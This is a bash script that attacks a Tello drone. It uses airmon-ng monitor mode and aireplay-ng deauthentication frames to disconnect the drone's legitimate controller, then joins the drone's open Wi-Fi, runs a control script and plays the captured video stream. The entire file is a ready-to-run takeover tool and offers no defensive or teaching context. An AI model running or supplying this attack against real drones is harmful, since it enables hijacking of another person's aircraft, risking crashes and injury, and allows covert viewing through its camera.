#!/bin/bash
set -e

# deauth tello drone and take over with sdk
# run this with sudo

# config - CHANGE THESE to match your drone
INTERFACE="wlan0"
DRONE_BSSID="AA:LL:II:11:22:22"   # drone mac, get it from: sudo python3 scan.py
DRONE_SSID="TELLO-123456"         # drone wifi name
DRONE_PASS=""                     # wifi pass, leave empty if none
VIDEO_PORT=11111

# need root
if [ "$EUID" -ne 0 ]; then
  echo "[-] run as root: sudo ./run_attack.sh"
  exit 1
fi

# check if user changed the mac address
if [ "$DRONE_BSSID" = "AA:LL:II:11:22:22" ]; then
  echo "[-] change DRONE_BSSID first!"
  echo "    run: sudo python3 scan.py"
  exit 1
fi

# cleanup function - runs when script exits
cleanup() {
  echo "[*] cleaning up..."
  airmon-ng stop "$MON_IFACE" 2>/dev/null || true
  systemctl restart NetworkManager 2>/dev/null || true
}
trap cleanup EXIT

# kill stuff that blocks monitor mode
echo "[*] killing interfering processes..."
airmon-ng check kill 2>/dev/null || true

# enable monitor mode
echo "[*] starting monitor mode..."
airmon-ng start "$INTERFACE"

# find the monitor interface name (diff drivers name it diff)
MON_IFACE=""
for iface in "${INTERFACE}mon" "${INTERFACE}_mon"; do
  if ip link show "$iface" &>/dev/null; then
    MON_IFACE="$iface"
    break
  fi
done

if [ -z "$MON_IFACE" ]; then
  echo "[-] monitor interface not found, check: iwconfig"
  exit 1
fi

echo "[+] using $MON_IFACE"

# send deauth packets to disconnect the controller
echo "[*] sending deauth to $DRONE_BSSID..."
aireplay-ng --deauth 10 -a "$DRONE_BSSID" "$MON_IFACE"

# stop monitor mode
echo "[*] stopping monitor mode..."
airmon-ng stop "$MON_IFACE"

# restart network manager and reconnect to drone
echo "[*] reconnecting to drone wifi..."
systemctl restart NetworkManager 2>/dev/null || true
sleep 3

if [ -z "$DRONE_PASS" ]; then
    nmcli dev wifi connect "$DRONE_SSID" ifname "$INTERFACE"
else
    nmcli dev wifi connect "$DRONE_SSID" password "$DRONE_PASS" ifname "$INTERFACE"
fi

echo "[*] waiting for connection..."
sleep 5

# check if we can reach the drone
if ! ping -c 3 -W 2 192.168.10.1 &>/dev/null; then
  echo "[-] cant reach drone at 192.168.10.1"
  echo "    try: nmcli dev wifi connect '$DRONE_SSID' ifname $INTERFACE"
  exit 1
fi
echo "[+] drone is up"

# run the sdk control script
echo "[*] starting control script..."
python3 control.py &
CTRL_PID=$!
sleep 3

# open video stream (tello sends h264 on port 11111)
echo "[*] opening video stream (ctrl+c to stop)..."
ffplay -probesize 32 -framerate 30 -i "udp://0.0.0.0:${VIDEO_PORT}"

# stop control script when ffplay closes
kill "$CTRL_PID" 2>/dev/null || true
echo "[+] done"
